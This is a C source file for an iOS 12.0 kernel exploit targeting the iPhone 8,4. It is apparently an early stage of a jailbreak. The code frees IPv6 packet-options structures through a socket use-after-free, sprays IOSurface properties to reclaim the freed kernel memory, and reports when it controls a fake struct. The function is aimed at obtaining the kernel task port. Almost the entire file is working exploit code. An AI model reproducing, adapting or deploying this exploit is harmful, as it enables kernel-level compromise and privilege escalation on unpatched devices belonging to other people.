//
//  exploit.c
//  se12.0exploit
//
//  Created by Justin Sherman on 1/13/20.
//  Copyright Â© 2020 Justin Sherman. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "exploit.h"

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

static const int IP6_PKTOPTS_STRUCTS_TO_SPRAY = 100;

static const int MINMTU_MAGIC = 0x99559955;

static vm_size_t PAGESIZE = 0;
static size_t SPRAY_DICT_SZ = 0;

static kern_return_t create_IOSurface_client(mach_port_t *client_out,
        uint32_t *surface_id_out){
    CFMutableDictionaryRef matching_dict = IOServiceMatching("IOSurfaceRoot");

    if(!matching_dict)
        return KERN_FAILURE;

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            matching_dict);

    if(service == IO_OBJECT_NULL)
        return KERN_FAILURE;

    io_connect_t client = IO_OBJECT_NULL;
    kern_return_t kret = IOServiceOpen(service, mach_task_self(), 0, &client);

    if(kret)
        return kret;

    uint32_t dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeString | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, /* "IOSurfaceAllocSize" */
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000, 0x0,
    };

    /* iPhone 8,4 iOS 12.0 (16A366) */
    size_t surface_sz = 0xdd0;
    char *surface = malloc(surface_sz);
    kret = IOConnectCallStructMethod(client, IOSURFACE_CREATE, dict, sizeof(dict),
            surface, &surface_sz);

    if(kret)
        return kret;

    *surface_id_out = *(uint32_t *)((uint8_t *)surface + 0x18);

    free(surface);
    surface = NULL;

    *client_out = client;

    return KERN_SUCCESS;
}

static void create_spray_dict(mach_port_t client, uint32_t surface_id,
        struct ip6_pktopts *pktops, char **spray_dict_out){
    /* spray kalloc.192, sizeof(*pktops) == 192 */
    const uint32_t OSString_len = sizeof(*pktops);

    uint32_t *spray_dict = malloc(SPRAY_DICT_SZ);
    const uint32_t *spray_dict_start = spray_dict;

    *(spray_dict)++ = surface_id;
    *(spray_dict)++ = 0;
    *(spray_dict)++ = kOSSerializeBinarySignature;
    *(spray_dict)++ = kOSSerializeArray | 1 | kOSSerializeEndCollection;
    *(spray_dict)++ = kOSSerializeDictionary | IP6_PKTOPTS_STRUCTS_TO_SPRAY | kOSSerializeEndCollection;

    for(uint32_t i=0; i<IP6_PKTOPTS_STRUCTS_TO_SPRAY; i++){
        *(spray_dict)++ = kOSSerializeSymbol | 4;
        /* key */
        *(spray_dict)++ = i;
        *spray_dict = kOSSerializeString | (OSString_len - 1);

        if(i+1 == IP6_PKTOPTS_STRUCTS_TO_SPRAY)
            *spray_dict |= kOSSerializeEndCollection;

        spray_dict++;

        const uint8_t *current_OSString_end = (uint8_t *)spray_dict +
            (OSString_len - 1);

        memcpy(spray_dict, pktops, sizeof(*pktops));
        spray_dict += (sizeof(*pktops) / sizeof(uint32_t));
    }

    *spray_dict_out = spray_dict_start;
}

static void my_mach_zone_force_gc(void){
    mach_port_t recv_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int kalloc_zone = 32768;

    /* in the kernel, each port will be an 8 byte pointer, purpose of this
     * is to make the largest allocation we can for a given zone
     */
    int port_count = kalloc_zone / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    /* shoving 16mb into kalloc.32768 works really well */
    int msgcount = 512;

    for(int i=0; i<msgcount; i++){
        mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
                MACH_PORT_NULL, 0, MACH_PORT_NULL);
    }

    free(oolmsg);
    free(ports);

    mach_port_destroy(mach_task_self(), recv_port);
}

static int create_vulnerable_socket(void){
    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    if(s == -1){
        printf("error creating socket: %s\n", strerror(errno));
        return -1;
    }

    struct so_np_extensions ex = {
        .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT
    };
    
    int err = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &ex, sizeof(ex));

    if(err == -1){
        printf("first setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int minmtu = IP6PO_MINMTU_ALL;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));

    if(err == -1){
        printf("second setsockopt: %s\n", strerror(errno));
        return -1;
    }

    return s;
}

static int get_minmtu(int socket, int *minmtu){
    size_t minmtu_sz = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &minmtu_sz);
}

int exploit(mach_port_t *tfp0out){
    /* printf("sizeof(struct ip6_pktopts) = %#x\n", sizeof(struct ip6_pktopts)); */

    kern_return_t kret;
    mach_port_t client = MACH_PORT_NULL;
    uint32_t surface_id = 0;

    if((kret = create_IOSurface_client(&client, &surface_id)) != KERN_SUCCESS){
        printf("Couldn't create a new IOSurface: %s\n", mach_error_string(kret));
        return 1;
    }

    /* printf("Got usable surface ID %d\n", surface_id); */

    _host_page_size(mach_host_self(), &PAGESIZE);

    SPRAY_DICT_SZ = (5 * sizeof(uint32_t)) +
        (IP6_PKTOPTS_STRUCTS_TO_SPRAY * 
         ((3 * sizeof(uint32_t)) + sizeof(struct ip6_pktopts)));

    /* printf("Page size: %#x\n", PAGESIZE); */

    struct ip6_pktopts *fake_pktops = calloc(1, sizeof(struct ip6_pktopts));
    fake_pktops->ip6po_minmtu = MINMTU_MAGIC;

    char *spray_dict = NULL;
    create_spray_dict(client, surface_id, fake_pktops, &spray_dict);

    int num_sockets = 100;
    int sockets[num_sockets];

    for(int i=0; i<num_sockets; i++){
        /* this will initialize inp_depend6.inp6_outputopts for this socket */
        int s = create_vulnerable_socket();

        if(s == -1){
            printf("Could not create socket %d\n", i);
            return 1;
        }

        sockets[i] = s;
    }
    
    /* free inp_depend6.inp6_outputopts for each socket, each time creating a
     * dangling pointer
     */
    for(int i=0; i<num_sockets; i++)
        disconnectx(sockets[i], 0, 0);

    /* try and reallocate the memory pointed to some of those dangling pointers */
    uint32_t out = 0;
    size_t outsz = sizeof(out);

    kret = IOConnectCallStructMethod(client, IOSURFACE_SET_PROPERY, spray_dict,
            SPRAY_DICT_SZ, &out, &outsz);

    printf("IOConnectCallStructMethod %s\n", mach_error_string(kret));

    int evil_socket = -1;

    for(int i=0; i<num_sockets; i++){
        int minmtu = 0;
        if(get_minmtu(sockets[i], &minmtu))
            continue;

        if(minmtu == MINMTU_MAGIC){
            evil_socket = sockets[i];
            break;
        }
    }

    if(evil_socket == -1){
        printf("Wasn't able to reallocate a freed ip6_pktopts struct\n");
        return 1;
    }

    int minmtu = 0;
    if(get_minmtu(evil_socket, &minmtu)){
        printf("Could not get minmtu value from evil_socket?\n");
        return 1;
    }

    printf("Got a controlled ip6_pktopts struct, minmtu: %#x\n", minmtu);

    return 0;
}
